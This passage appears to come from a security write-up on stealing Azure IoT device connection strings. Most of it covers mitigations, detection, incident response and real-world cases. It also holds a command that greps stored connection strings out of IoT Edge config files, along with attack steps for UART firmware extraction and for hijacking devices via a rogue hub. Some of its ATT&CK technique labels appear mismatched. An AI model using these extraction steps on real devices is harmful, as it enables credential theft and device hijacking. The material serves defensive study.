* **Enable Device Update and Credential Rotation:**
  
  **Manual Steps:**
  1. Deploy Azure Device Update agent on all IoT devices:
     ```bash
     # Install on Linux IoT device
     sudo apt-get install deviceupdate-agent
     ```
  2. Create deployment job in Azure Device Update portal
  3. Push firmware/configuration updates that rotate device credentials
  4. Ensure all devices receive updates within 30 days of credential rotation
  5. Revoke old credentials in IoT Hub after rotation complete

---

### Priority 2: HIGH

* **Implement Device Provisioning Service (DPS) with Attestation:**
  
  **Manual Steps:**
  1. Create Azure IoT Hub Device Provisioning Service instance
  2. Configure enrollment groups with X.509 certificate attestation (not symmetric keys)
  3. At manufacturing, provision unique X.509 certificate into device (via HSM)
  4. Do NOT use shared symmetric keys across multiple devices
  5. During DPS provisioning, IoT Hub is assigned automatically based on device certificate
  
  **Validation:**
  ```bash
  az iot dps enrollment list --dps-name <dps-name> --resource-group <rg>
  # Should show: attestationType = "x509CertificateCA" (not "symmetricKey")
  ```

* **Restrict DPS Service Principal Permissions:**
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **IoT Hub Device Provisioning Service** → **Access control (IAM)**
  2. Find service principal used by DPS
  3. Limit role to **Device Provisioning Service Reader** only (not Admin)
  4. Remove ability to modify enrollments
  5. Only authorized admins should have modification permissions
  
  **Validation:**
  ```bash
  az role assignment list \
    --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Devices/ProvisioningServices/<dps>
  # Should show restrictive role assignments
  ```

* **Enable Network Security and IP Filtering:**
  
  **Manual Steps:**
  1. **Restrict IoT Hub to private endpoint:**
     ```bash
     az iot hub private-endpoint-connection approve \
       --hub-name <hub-name> \
       --name <endpoint-connection-name>
     ```
  2. **Disable public network access:**
     ```bash
     az iot hub update \
       --name <hub-name> \
       --public-network-access Disabled
     ```
  3. **Restrict device connectivity to corporate VPN/network only**
  4. **Enable IP filtering on IoT Hub:**
     ```bash
     az iot hub ip-filter add \
       --hub-name <hub-name> \
       --ip-filter-name AllowCorporateRange \
       --ip-address-range 10.0.0.0/8 \
       --action Accept
     ```

* **Audit and Monitor Device Access:**
  
  **Manual Steps:**
  1. Enable diagnostic logging on IoT Hub:
     ```bash
     az monitor diagnostic-settings create \
       --resource-type Microsoft.Devices/IotHubs \
       --resource <hub-name> \
       --name iot-hub-diagnostics \
       --logs '[{"category":"Connections","enabled":true}]'
     ```
  2. Send logs to Sentinel or Log Analytics
  3. Set up alerts for:
     - New device enrollments
     - Bulk device creation
     - Direct method invocations (especially unexpected targets)
     - Connection from new IP addresses
  4. Review logs monthly for suspicious patterns

---

### Priority 3: MEDIUM

* **Implement Device Configuration as Code:**
  
  **Pattern:**
  - Store device configuration in Azure AppConfig or Key Vault
  - Device downloads configuration (not credentials) on startup
  - Connection string is vaulted in Azure, never sent to device
  - Device authenticates via MSI (Managed Service Identity) to fetch config
  
  **Manual Implementation:**
  ```yaml
  # In IoT Edge config:
  [provisioning]
  source = "dps"  # Use DPS, not manual connection string
  global_endpoint = "https://global.azure-devices-provisioning.net"
  scope_id = "<dps-id-scope>"
  
  # Device authenticates via X.509 cert, not connection string
  [provisioning.attestation]
  method = "x509"
  identity_cert = "file:///var/secrets/device.cert.pem"
  identity_pk = "file:///var/secrets/device.key.pem"
  ```

* **Implement Secure Boot and Measured Boot:**
  
  **Manual Steps (Device OEMs):**
  1. Enable Secure Boot in device firmware
  2. Sign all firmware updates with manufacturer's private key
  3. Device verifies signature before executing update
  4. Prevents firmware injection attacks
  5. Enable Trusted Platform Module (TPM) for measured boot (records boot sequence hash)

---

### Validation Command (Verify Mitigations)

**PowerShell / Azure CLI - Check IoT Hub Security Configuration:**

```powershell
# Check if connection string authentication is disabled:
az iot hub policy list --hub-name <hub-name> --query "[].keyName"
# Should show minimal policies (ideally only system/service policies)

# Check if DPS uses certificate attestation:
az iot dps enrollment list --dps-name <dps-name> \
  --query "[].attestationType" | grep -i "x509\|tpm"
# Should NOT show "symmetricKey"

# Verify minimum TLS version:
az iot hub show --name <hub-name> --query "properties.minTlsVersion"
# Should be "1.2"

# Check device connection audit logs:
az monitor log-analytics query \
  --workspace <workspace-id> \
  --analytics-query "AuditLogs | where OperationName contains 'device' | distinct InitiatedBy"
# Should show only expected service principals, not user accounts
```

**Expected Output (If Secure):**

```
Connection string authentication: Disabled
DPS attestation type: x509CertificateCA
Minimum TLS version: 1.2
Recent device modifications: (Only by automated deployment service, not users)
```

---

## 9. Detection & Incident Response

### Indicators of Compromise (IOCs)

* **Firmware/Configuration:**
  - Plaintext connection string in firmware or config file (obvious compromise)
  - Unexpected changes to `/etc/aziot/config.toml` timestamp or permissions
  - Newly added service accounts or SSH keys in `~/.ssh/authorized_keys`

* **Network:**
  - Device connecting from unusual IP address range
  - Abnormally high volume of cloud-to-device messages
  - Device sending telemetry with suspicious timestamps or values (data poisoning)
  - Unexpected outbound connections from device to external IPs

* **Behavioral:**
  - Multiple devices claiming same device ID (duplicate enrollment in DPS)
  - Device sending commands to other devices (hijacked device sending to peer devices)
  - Rapid sequence of direct method invocations
  - Device twin modifications without matching device request logs

---

### Forensic Artifacts

* **Device:**
  - `/var/log/iotedge/edgeagent.log` - IoT Edge agent logs (connection attempts, module loads)
  - `/var/log/iotedge/edgehub.log` - IoT Edge hub logs (message routing, device connections)
  - `/etc/aziot/config.toml` - Configuration file (may show connection string if not rotated)
  - `/var/lib/iotedge/` - IoT Edge data directory (certificates, state)
  - `/var/log/auth.log` - SSH login attempts and privilege escalation

* **Cloud (Azure IoT Hub / Sentinel):**
  - **AuditLogs table:** Device creation, enrollment, permission changes
  - **Device connection logs:** IP addresses, timestamps, success/failure
  - **Device twin history:** Changes to desired/reported properties (if change tracking enabled)
  - **Direct method invocations:** Method names, arguments, return values

---

### Response Procedures

1. **Isolate:**
   
   **Immediate:**
   ```bash
   # Disable device in IoT Hub:
   az iot hub device-identity update \
     --hub-name <hub-name> \
     --device-id <compromised_device_id> \
     --status disabled
   
   # Revoke connection string:
   az iot hub device-identity renew-key \
     --hub-name <hub-name> \
     --device-id <compromised_device_id> \
     --key-type primary  # This invalidates all connections using old key
   ```
   
   **Physical:**
   - Power off device if possible
   - Disconnect from network (unplug Ethernet, disable WiFi)
   - Preserve device for forensic analysis

2. **Collect Evidence:**
   
   ```bash
   # Export device logs from IoT Hub:
   az iot hub monitor-events \
     --hub-name <hub-name> \
     --device-id <device_id> \
     --properties all  > device_events.log
   
   # Export audit logs:
   az monitor log-analytics query \
     --workspace <workspace_id> \
     --analytics-query "AuditLogs | where TargetResources contains '<device_id>' | sort by TimeGenerated desc" \
     > device_audit.csv
   
   # If physical access: Image entire device storage
   dd if=/dev/sda of=/mnt/forensics/device.img
   ```

3. **Remediate:**
   
   ```bash
   # Step 1: Rotate all device credentials (if not already done)
   az iot hub device-identity renew-key \
     --hub-name <hub-name> \
     --device-id <all_devices> \
     --key-type both  # Rotate both primary and secondary
   
   # Step 2: Update device firmware with new configuration
   # (Via Device Update for IoT Hub or manual update)
   
   # Step 3: Re-enable device after verification:
   az iot hub device-identity update \
     --hub-name <hub-name> \
     --device-id <device_id> \
     --status enabled
   
   # Step 4: Verify new credentials are in use:
   az iot hub device-twin show --hub-name <hub-name> --device-id <device_id> \
     --query "properties.reported.connectivity"  # Should show new connection time
   ```

4. **Escalate:**
   
   **Notify:**
   - Security team (incident investigation)
   - DevOps/IoT ops team (device recovery)
   - Compliance/Legal (possible breach reporting under GDPR, sector-specific regulations)
   - Incident response (broader supply chain assessment if firmware was compromised)
   
   **Incident Report Should Include:**
   - Device ID and model affected
   - When connection string was likely compromised
   - What data may have been accessed/modified
   - Number of other devices using similar firmware
   - Remediation timeline and new credential distribution

---

## 10. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1200 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1200/) | Physical tampering or network vulnerability exploitation to gain device shell access |
| **2** | **Discovery** | [T1526 - Cloud Service Discovery](https://attack.mitre.org/techniques/T1526/) | Enumerate configuration files to find IoT Hub name, DPS scope |
| **3** | **Credential Access** | **[CA-UNSC-017] IoT Device Connection Strings Theft** | Extract connection string from firmware, config, or memory |
| **4** | **Lateral Movement** | [T1570 - Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570/) | Use stolen device identity to access other IoT devices in same hub |
| **5** | **Persistence** | [T1547 - Boot or Logon Autostart Execution](https://attack.mitre.org/techniques/T1547/) | Modify device firmware or startup scripts to maintain persistence |
| **6** | **Exfiltration** | [T1041 - Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/) | Send sensor data or commands to attacker's server using hijacked device |
| **7** | **Impact** | Supply Chain Attack | Compromise firmware for thousands of deployed devices; inject malicious firmware updates |

---

## 11. Real-World Examples

### Example 1: Mirai Botnet (2016) - Default Credentials on IoT Devices

- **Target:** 820,000+ IoT devices (cameras, routers, DVRs)
- **Timeline:** August-October 2016
- **Technique Status:** ACTIVE (variant still exploiting weak credentials in 2025)
- **Attack Vector:** Automated scanning for IoT devices with default credentials; credential stuffing with common usernames/passwords
- **Impact:**
  - Largest DDoS attack in history (October 2016): 620 Gbps
  - Brought down Dyn DNS service, affecting AWS, Twitter, GitHub, Netflix
  - Infected 100,000+ devices per day at peak
- **Key Lesson:** Even without sophisticated attack, basic credential compromise at scale is catastrophic
- **Reference:** [Mirai Wikipedia](https://en.wikipedia.org/wiki/Mirai_(malware))

---

### Example 2: WAGO IoT Device Firmware Vulnerability (CVE-2019-5160)

- **Target:** WAGO Industrial IoT controllers (PLC/gateway devices)
- **Timeline:** Discovered 2019; still vulnerable in some deployments
- **Vulnerabilities:**
  - **CVE-2019-5160:** No validation of Azure IoT Hub hostname → Attacker can redirect device to rogue IoT Hub
  - **CVE-2019-5134/5135:** Hardcoded credentials in web interface; timing attack extracts password hash
- **Attack Chain:**
  1. Access WAGO device web interface via default credentials or timing attack
  2. Modify configuration to point to attacker-controlled Azure IoT Hub
  3. Device connects to attacker's hub, unknowingly
  4. Attacker sends malicious commands via cloud-to-device messages
  5. Device executes commands in ICS environment (potential for safety hazard)
- **Impact:** Supply chain compromise affecting industrial automation
- **Reference:** [Talos: WAGO Vulnerability Analysis](https://blog.talosintelligence.com/vulnerability-spotlight-deep-dive-into/)

---

### Example 3: Firmware Extraction via UART - Practical IoT Hacking (Quarkslab 2025)

- **Target:** Generic IP camera (similar to many commercial IoT devices)
- **Timeline:** 2025 research
- **Attack Steps:**
  1. Opened device casing; identified UART pins (TXD, RXD, GND) on PCB
  2. Soldered USB-to-UART adapter to pins
  3. Connected to Linux terminal; monitored boot messages
  4. Boot logs revealed plaintext WiFi SSID and password
  5. Used credentials to access device management interface
  6. Modified configuration to redirect to attacker-controlled server
  7. Reverse engineered firmware to find hardcoded device key
- **Impact:** Complete device compromise; ability to spy on camera feed or pivot to network
- **Key Lesson:** Physical access to device for just minutes is sufficient for experienced attacker
- **Reference:** [Quarkslab: IoT Attack Scenarios](https://www.quarkslab.com/iot-attack-scenarios/)

---

## 12. ATTACK VARIATIONS & VERSION-SPECIFIC NOTES

### IoT Edge 1.0-1.1 (Older Versions)

**Differences:**
- Configuration file: `/etc/iotedge/config.yaml` (instead of `/etc/aziot/config.toml`)
- Connection string storage: Less secure; fewer obfuscation measures
- DPS support: Limited; primarily manual connection string

**Exploitation:**
```bash
# Older version config location:
sudo cat /etc/iotedge/config.yaml | grep "connection_string"
```

---

### IoT Edge 1.2+ with X.509 Certificate Authentication

**Differences:**
- No connection string; certificate-based auth
- Credentials stored in TPM or HSM if available
- Configuration references certificate paths, not keys

**Exploitation Challenge:**
- Cannot extract connection string (doesn't exist)
- Must steal the private key from HSM/TPM (much harder)
- Or compromise DPS enrollment to issue new device certificate

---

### Azure IoT Central (SaaS Platform)

**Differences:**
- Uses DPS for device provisioning automatically
- Device credentials are symmetric keys from DPS
- Keys are shorter-lived but still need protection

**Exploitation:**
```bash
# Same as DPS attack (see METHOD 4)
az iot central device show --app-id <central-app> --device-id <device_id>
```

---
